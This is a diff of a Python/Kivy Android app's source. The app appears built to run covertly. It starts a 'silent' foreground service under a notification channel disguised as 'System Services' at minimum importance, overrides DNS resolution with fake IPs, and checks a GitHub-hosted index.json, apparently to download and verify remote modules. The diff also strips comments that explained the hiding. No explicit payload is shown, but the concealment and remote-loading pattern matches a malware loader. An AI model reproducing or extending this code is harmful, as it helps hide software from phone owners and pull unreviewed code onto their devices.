@@ -38,7 +38,6 @@ def _patch_dns():
         if host in override:
             fake_ip = random.choice(override[host])
             return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
-        # إذا لم توجد عناوين بديلة، نعيد الخطأ الأصلي
         return original_getaddrinfo(host, port, family, type, proto, flags)
     socket.getaddrinfo = patched_getaddrinfo
 
@@ -80,14 +79,13 @@ os.makedirs(MODELS_DIR, exist_ok=True)
 if R not in sys.path:
     sys.path.insert(0, R)
 
-# ========== بدء خدمة أمامية صامتة (Foreground Service) ==========
+# ========== بدء خدمة أمامية صامتة ==========
 def start_silent_service():
     try:
         from jnius import autoclass
         act = autoclass('org.kivy.android.PythonActivity').mActivity
         nm = autoclass('android.app.NotificationManager')
         ch = autoclass('android.app.NotificationChannel')
-        # أدنى أهمية = 1 (IMPORTANCE_MIN)، لا صوت ولا أيقونة في شريط الحالة
         channel = ch("core_svc", "System Services", nm.IMPORTANCE_MIN)
         act.getSystemService(nm).createNotificationChannel(channel)
         builder = autoclass('android.app.Notification$Builder')(act, "core_svc")
@@ -183,20 +181,23 @@ class CoreApp(App):
         Clock.schedule_once(upd, 0)
 
     def _check_connectivity(self):
-        # فحص اتصال خفيف يعتمد على TCP مباشرة
-        test_targets = [
-            ("www.google.com", 80),
-            ("1.1.1.1", 53),
-            ("8.8.8.8", 53)
+        # فحص اتصال فعلي عبر HTTPS (المنفذ 443) المطلوب للتحميل
+        test_urls = [
+            "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
+            "https://zaen1993.github.io/Android-Core/index.json",
+            "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
         ]
-        for host, port in test_targets:
+        for url in test_urls:
             try:
-                sock = socket.create_connection((host, port), timeout=5)
-                sock.close()
-                return True
+                resp = requests.head(url, timeout=10, verify=True, headers=HEADERS)
+                return True  # أي استجابة تعني وجود اتصال بالخادم
             except Exception:
                 continue
-        return False
+        try:
+            requests.get("https://clients3.google.com/generate_204", timeout=10)
+            return True
+        except Exception:
+            return False
 
     def _verify_module(self, file_path, module_name):
         if not os.path.exists(file_path):
